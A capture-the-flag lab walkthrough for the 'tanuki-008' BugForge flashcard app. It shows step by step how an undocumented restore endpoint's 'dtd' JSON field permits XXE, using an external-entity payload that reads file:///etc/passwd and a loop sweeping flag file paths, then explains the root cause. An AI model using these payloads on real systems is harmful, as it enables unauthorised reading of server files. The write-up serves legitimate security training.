# tanuki-008 - BugForge Lab Walkthrough

**URL:** https://lab-1784584152987-m28khi.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** XXE (XML External Entity injection) via a hidden `dtd` parameter on the deck restore endpoint
**Flag:** `bug{sCKZPsW5GC9erccEET5QmWdcWxz0UIkf}`

---

## Summary

Tanuki is a spaced repetition flashcard SPA (React/Express/SQLite, same app family as prior Tanuki labs). The Dashboard only exposes an "Export Backup" button, which downloads a deck as an XML file. There is no Import/Restore button anywhere in the UI, but the backend exposes a matching `POST /api/decks/:id/restore` endpoint that isn't referenced by the frontend at all. The endpoint accepts a JSON body and rebuilds an internal XML document server-side before parsing it, including an undocumented `dtd` key that gets spliced verbatim into the DOCTYPE's internal subset, giving full control over a classic external-entity file-read primitive.

## Tech Stack

- Frontend: React SPA (CRA, MUI), source maps exposed
- Backend: Express.js, SQLite
- Auth: JWT, token returned directly on registration
- Decks/cards are global, not scoped per user

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | Returns token directly, usable immediately |
| `GET /api/decks` | Bearer | Lists all decks, global not user-scoped |
| `GET /api/decks/:id` | Bearer | Single deck detail |
| `GET /api/decks/:id/backup` | Bearer | XML export, the only backup feature the frontend actually calls |
| `POST /api/decks/:id/restore` | Bearer | Undocumented, not called by any frontend code, path `:id` is ignored entirely, always creates a new deck |

## Attack Chain

### Step 1 - Register and get a token

```
POST /api/register {"username","email","password"}
-> bearer token
```

### Step 2 - Export a deck to inspect the XML schema

```
GET /api/decks/1/backup (Authorization: Bearer <token>)
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE backup [
  
]>
<backup>
  <name>Planets & Moons</name>
  ...
```

The internal DTD subset (between `[` and `]`) is present but empty, a strong signal that user-supplied DTD content is meant to land exactly there on the way back in.

### Step 3 - Call restore with a dtd field and an entity reference

```
POST /api/decks/1/restore (Content-Type: application/json, Authorization: Bearer <token>)
```

```json
{
  "dtd": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
  "name": "&xxe;",
  "description": "d",
  "category": "c",
  "cards": []
}
```

```
{"id":4,"message":"Backup restored successfully","cards_count":0}
```

### Step 4 - Fetch the created deck

```
GET /api/decks/4
-> {"name":"Flag is in a different file", ...}
```

The response is a static placeholder for a real-but-wrong file path, itself a useful oracle confirming the entity resolved against a real path on disk.

### Step 5 - Sweep candidate flag paths

```
for f in "/app/flag.txt" "/flag.txt" "/flag" "flag.txt" "./flag.txt"; do
  POST /api/decks/1/restore {"dtd":"<!ENTITY xxe SYSTEM \"file://$f\">","name":"&xxe;", ...}
done
```

`file:///app/flag.txt` resolves. `GET /api/decks/:id` returns:

```json
{"name":"bug{sCKZPsW5GC9erccEET5QmWdcWxz0UIkf}", ...}
```

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `Content-Type: application/xml` with a full backup-shaped document (with/without DOCTYPE, `<backup>` vs `<deck>` root, multipart upload) | This code path never parses the body at all, always creates a blank "Untitled Deck" with `cards_count:0` regardless of well-formedness | A documented Content-Type switch is not always the real import surface, the trigger here was a JSON body key, not a header |
| Entity or XInclude tags placed directly in `cards[].back` or `cards[].front` | Any string field starting with `<` is coerced to a generic object and stringified to literal `"[object Object]"` on write, confirmed independent of file existence | A separate, non-exploitable quirk unrelated to the real XXE surface |
| Literal `DOCTYPE` keyword anywhere in the JSON body | Blocked with `{"error":"Invalid backup format"}`, a case-sensitive substring check on the whole body | The bypass is not a DOCTYPE-keyword trick, the bare entity declaration goes in a dedicated `dtd` field since the server supplies the `<!DOCTYPE ...[ ]>` wrapper itself |
| Blind OOB via `SYSTEM "http://..."` and XInclude in card fields | Zero outbound hits, no SSRF via that channel | Confirms the card-field mangling bug and the real `dtd`-field XXE are unrelated code paths |
| Brute forcing thousands of common parameter names as JSON keys, query params, and headers | No hits, `dtd` is not a generic API wordlist term | A structural clue in the app's own data format (the empty DTD internal subset in the export) beats blind wordlist fuzzing |

## Root Cause

The restore endpoint builds an XML document server-side by concatenating client-supplied fields, including a raw DTD fragment, directly into a `<!DOCTYPE ... [ ... ] >` internal subset, then parses the resulting document with external entity resolution enabled:

```javascript
// Vulnerable pattern (approximate)
const xml = `<?xml version="1.0"?>
<!DOCTYPE backup [
  ${body.dtd || ''}
]>
<backup>
  <name>${body.name}</name>
  ...
</backup>`;
parseWithExternalEntities(xml);
```

No allowlist or schema validation exists on the `dtd` field's content, it accepts arbitrary DTD declarations including `SYSTEM` external entities pointing at `file://` URIs. The endpoint is not reachable from any documented UI flow, so there is no legitimate reason for it to accept raw DTD content at all, this looks like a leftover, unhardened internal restore mechanism.

## CWE / OWASP

- **CWE-611**: Improper Restriction of XML External Entity Reference
- **CWE-91**: XML Injection
- **OWASP API Security Top 10**: API8:2023 - Security Misconfiguration
